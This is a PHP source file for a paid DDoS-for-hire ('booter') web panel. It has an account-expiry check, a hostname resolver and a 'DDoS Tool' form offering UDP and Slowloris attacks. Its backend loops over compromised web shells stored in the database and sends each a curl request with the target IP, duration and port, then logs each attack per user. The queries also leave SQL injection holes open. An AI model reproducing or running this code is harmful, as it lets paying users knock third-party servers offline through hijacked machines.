<?php
require("header.php");
?>

<?php
$username = $_SESSION['user_name'];
$id = $_SESSION['user_id'];
$level = $_SESSION['user_level'];
$query = "SELECT * FROM users WHERE id=$id";
$result = mysql_query($query);
$row = mysql_fetch_array($result, MYSQL_ASSOC);
$datetday = date("Ymd") ;
$months = $row['months'];
if ( $datetday > $months ) {
	die("Your Account has expired Please Pay to reactivate your account");
}

?>
<script src="javascript/jquery-1.4.4.min.js" type="text/javascript"></script>
<script type="text/javascript">

function hub()
	{
	if (window.XMLHttpRequest)
	  {
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {
	    document.getElementById("sent").innerHTML = "Request has been sent to all shells.";
	    }
	  }
	xmlhttp.open("GET","hub.php?host="+document.getElementById('host').value+"&time="+document.getElementById('time').value+"&port="+document.getElementById('port'));
	xmlhttp.send();
}
</script>
 <script>
for(var i=0;i<15;i++)
setTimeout("foo('"+i+"')",(15-i)*500);
function foo(n){
document.getElementById('btn').value=n;
if(n==0){
document.getElementById('btn').value='DDoS';
document.getElementById('btn').disabled=false;
}
}
</script>
<div class="box">
    <h2>Message of the Day!</h2>
    <div class="box-content">
        <p>
            <font color="red"><center><strong>3/20/2011</strong></font>: Getting a domain soon.</center>
        </p>
    </div>

</div>
<div class="box">
    <h2>Resolve Host to IP Address</h2>
    <div class="box-content">
        <p>
          <?php
function printForm()
{
global $www;

$action = $_SERVER["PHP_SELF"];

print <<<ENDHTM
<center><form method="post" action="$action">
<p>http:// <input type="text" name="www" value="$www"/> <input type="submit" value="Resolve"/></p>
</form></center>

ENDHTM;
}

if($_REQUEST['www'])
{
print $www;

$domain = strtolower($_REQUEST['www']);
$xArray = @parse_url($domain);

	if(!$xArray["scheme"])
	{
	$domain = "http://" . $domain;
	$xArray = @parse_url($domain);
	}

	$xProtocol = $xArray["scheme"];
	$xHost   = $xArray["host"];
	$xPort   = $xArray["port"];
	$xUser   = $xArray["user"];
	$xPass   = $xArray["pass"];
	$xPath   = $xArray["path"];
	$xQuery  = $xArray["query"];
	$xFragment = $xArray["fragment"];

	$domain = $xProtocol ."://". $xHost . $xPath . ($xQuery?"?":"") . $xQuery;
	$www = $xHost . $xPath . ($xQuery?"?":"") . $xQuery;

	printForm();

		if(@gethostbyname($xHost) == $xHost)
		{
		$ip2 = "Returned hostname";
		$hostname2 = "Cancelled";
		}
		else
		{
		$ip2 = @gethostbyname($xHost);
		$hostname2 = @gethostbyaddr($ip2);
		}
	print "<div><p><strong><font color=\"white\">IP Address</font></strong>: $ip2</p></div>\n";
	print "<div><p><strong><font color=\"white\">Hostname</font></strong>: $hostname2</p></div>\n";
}
else
{
		if(isset($_COOKIE['URL']))
		{
		$www = $_COOKIE['URL'];
		}
printForm();
}
?>
        </p>
    </div>
</div>


<div class="box">
<h2>DDoS Tool</h2>
<div class="box-content">
<p>
<center>
<form>
              <b>Attack Type</b><br> <select name="dosattack" id="dosattack">
                  <option value="1">UDP</option>
                  <option value="2">Slowloris</option>
                </select><br>
    <b>IP/DNS</b> <br><input type="text" style="text-align: center" size="16" name="host" value=""/><br />
    <b>Seconds</b> <br><input type="text" style="text-align: center" size="5" name="time" value="30"/><br />    
    <b>Port</b><br><input type="text" style="text-align: center" size="5" name="port" value="80"/><br />

    <input type="submit" disabled='disabled' class="button" id='btn' value='15'input="input" onclick="hub();" />

    </p><form>
<center>
  </p>
<form>
</form>
		 <form action="hub.php" method="post">
		  &nbsp;
		  </p>
                 </form>
<p id="sent"></p>
<script type="text/javascript">
function handleKeyPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		hub();
	}
}
function handleEnterPress(e,form){
	var key=e.keyCode || e.which;
	if (key==13){
		getip();
	}
}
</script>
<?php
set_time_limit(120);
ignore_user_abort(TRUE);

include 'includes/EpiCurl.php';
require("includes/ezSQLCore.php");
require("includes/ezSQL.php");

$query = mysql_query("SELECT * FROM `users` WHERE `id`='$_SESSION[user_id]' AND `banned`=1") or die(mysql_error());
if (mysql_num_rows($query) > 0) {
	mysql_query("update `users`
		set `ckey`= '', `ctime`= ''
		where `id`='$_SESSION[user_id]' OR  `id` = '$_COOKIE[user_id]'") or die(mysql_error());
	unset($_SESSION['user_id']);
	unset($_SESSION['user_name']);
	unset($_SESSION['user_level']);
	unset($_SESSION['HTTP_USER_AGENT']);
	session_unset();
	session_destroy();
	setcookie("user_id", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_name", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	setcookie("user_key", '', time()-60*60*24*COOKIE_TIME_OUT, "/");
	die("You do not have permission to view this page.");
}

if (isset($_GET['host']) && isset($_GET['time']) && isset($_GET['port']))
{

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `getshells`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


if($time >= 121) {
die("<hr>You cannot issue attacks exceeding 120 seconds.");
}

if($host == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($time == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

if($port == "") {
die("<center><strong><font color=\"red\">Sorry, but you must fill in all fields.</font></center></strong>");
}

/*
* Example Blacklisting
*/

if($host == "hackforums.net") { die("<hr>You cannot attack this."); }
if($host == "46.243.9.28") { die("<hr>You cannot attack this."); }

/*
* End of blacklisting
*/

    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&ip={$host}&time={$time}&port={$port}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }

	$Query = "SELECT * FROM `postshells`";
	$AffectedRows = $SQL->query($Query);
    $ch2 = array();
    $post = "ip={$host}&time={$time}&port={$port}";

//slowloris shell support

	$SQL = new ezSQL_mysql();
	$SQL->connect(DB_USER, DB_PASS);
	$SQL->select(DB_NAME);
	$Query = "SELECT * FROM `slowloris`";
        $AffectedRows = $SQL->query($Query);
        $host = $_GET['host'];
        $time = intval($_GET['time']);
        $port = intval($_GET['port']);
        $mc = EpiCurl::getInstance();
	$ch = array();


    for($i = 0; $i < $AffectedRows; $i++)
    {
	$row = $SQL->last_result[$i];
        $shell = trim($row->URL);

        if (strlen($shell) == 0)
            continue;

        $shell .= "?act=phptools&ip={$host}&time={$time}";
        $ch[$i] = curl_init($shell);
        curl_setopt($ch[$i], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch[$i], CURLOPT_TIMEOUT, 7);
        $curl1 = $mc->addCurl($ch[$i]);
    }


echo "<p id='sent'><center><strong><font color=\"lime\">Attack has been sent!</font></strong></center></p>";

$username = $_SESSION['user_name'];
$host = strip_tags(mysql_real_escape_string($_GET['host']));
$time = strip_tags(mysql_real_escape_string($_GET['time']));
$port = strip_tags(mysql_real_escape_string($_GET['port']));
$date = date("m-d-Y, h:i:s a", time());

mysql_query("INSERT INTO logs
(username, ip, time, port, date) VALUES('" . $username . "', '" .$host . "', '" . $time . "', '" . $port . "', '" . $date . "' ) ")
or die(mysql_error());

mysql_query("UPDATE users set myAttacks = myAttacks + 1 WHERE full_name = '" . $username . "'") or die(mysql_error());

}
?>

</div>
</div>
</body>
</html>

<br>

<?php
include 'footer.php';
?>